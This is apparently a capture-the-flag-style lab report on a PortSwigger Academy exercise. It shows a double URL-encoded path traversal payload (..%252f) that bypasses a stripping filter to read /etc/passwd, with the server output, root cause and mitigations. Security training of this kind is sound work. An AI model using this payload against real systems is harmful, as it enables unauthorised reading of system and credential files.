# Lab Report: File Path Traversal (Traversal sequences stripped with superfluous URL-decode)

## Overview
This lab demonstrates a **File Path Traversal** vulnerability where the application attempts to strip traversal sequences but fails due to improper handling of multiple decoding layers. The server-side filter removes literal `../` sequences, but if the payload is double-encoded (or encoded in a way the filter does not expect), the filter may remove only one layer while the server decodes again before file access.

The goal of this lab was to retrieve the contents of the `/etc/passwd` file.

---

## Steps to Exploitation

### 1. Initial Request
The application used a request parameter `filename` to fetch image files. Literal traversal sequences like `../../../../etc/passwd` were stripped or blocked by the filter.

### 2. Payload
A double-encoded traversal payload was used to bypass the filter by leveraging superfluous URL-decode behavior on the server:

```
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<valid-session-cookie>
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,*/*
```

**Explanation:**
- The filter strips literal `../` sequences but does not decode `%252f` (which is the encoding of `%2f`) before filtering.
- When the server decodes the parameter one or more times to resolve the path, `%252f` becomes `%2f`, and then `/`, resulting in `../../../etc/passwd`. This allows the file to be read.

### 3. Server Response
The server returned the contents of `/etc/passwd`, proving successful exploitation:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

---

## Evidence

### Exploit Request and Response
![Exploit Request and Response](/images/superfluous%20URL-decode1.jpg)

### Lab Solved Confirmation
![Lab Solved](/images/superfluous%20URL-decode1%20lab%20solved.jpg)

---

## Result
- Retrieved sensitive system file: `/etc/passwd`  
- Confirmed path traversal vulnerability by bypassing stripping with superfluous URL-decode  
- Lab status:  
  ✅ *"Congratulations, you solved the lab!"*

---

## Root Cause
- The application attempted to remove traversal sequences but did not canonicalize or fully decode the input prior to filtering.  
- Multiple decoding steps on the server converted encoded sequences into traversal sequences after the filter had already run.

---

## Mitigation
1. **Canonicalize input** — Decode and normalize input fully before applying any filtering, then validate the canonical path.  
2. **Use Whitelisting** — Restrict file access to a specific directory and a whitelist of filenames.  
3. **Reject encoded traversal** — After canonicalization, reject paths containing traversal components.  
4. **Avoid direct file paths** — Use indirect references (IDs or mappings) instead of exposing file paths to users.  
5. **Use secure APIs** — Use APIs that perform proper path normalization and avoid manual string-based filtering.

---

## Skills Demonstrated
- Testing for path traversal vulnerabilities  
- Bypassing naive filters using double-encoding (`%252f`)  
- Retrieving sensitive files from the server (`/etc/passwd`)  
- Documenting exploitation steps and capturing proof using Burp Suite

---

## References
- PortSwigger Academy: File path traversal, traversal sequences stripped with superfluous URL-decode  
- OWASP: Path Traversal

--- 

*End of report.*